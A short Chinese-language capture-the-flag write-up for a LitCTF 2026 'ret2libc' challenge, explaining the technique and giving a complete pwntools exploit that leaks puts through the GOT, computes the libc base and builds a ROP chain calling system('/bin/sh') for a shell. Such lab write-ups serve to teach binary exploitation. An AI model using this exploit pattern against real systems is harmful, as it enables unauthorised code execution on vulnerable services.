LitCTF 2026 - ret2libc

题目地址

这道题还是挺简单的挺适合初学者做的

前置知识补充：ret2libc攻击的核心思想是利用程序中的栈溢出漏洞，覆盖函数的返回地址，使其指向libc库中的system函数，并传递”/bin/sh”字符串作为参数，从而获得一个shell。

想要进阶的理解的话可以看这个深入理解 ret2libc 技术-先知社区

最基础的ret2libc 甚至还给了pop_rdi leak_value

checksec一下

ida一下

发现这里有现成的可以利用的rdi ret

还有泄露地址的地方

然后第一部分溢出之后然后泄露地址

然后返回main函数，接受地址之后

计算libc基址，然后溢出之后再binsh

from pwn import *

context(os="linux", arch="amd64")

elf = ELF("./ret2libc")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = process("./ret2libc")
#io = remote("challenge.cyclens.tech", 30528)

pop_rdi = 0x4011b7
ret = 0x4011b8
leak_value = 0x4011c3
main_addr = 0x401234

offset = 72

payload = b"a" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(leak_value)
payload += p64(ret)
payload += p64(main_addr)

io.recvuntil(b"Tell me your name: ")
io.send(payload)

io.recvuntil(b"Leak: ")
puts_addr = int(io.recvline().strip(), 16)
print("puts_addr =", hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))

print("libc_base =", hex(libc_base))
print("system_addr =", hex(system_addr))
print("binsh_addr =", hex(binsh_addr))

payload = b"a" * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)

io.recvuntil(b"Tell me your name: ")
io.send(payload)

io.interactive()
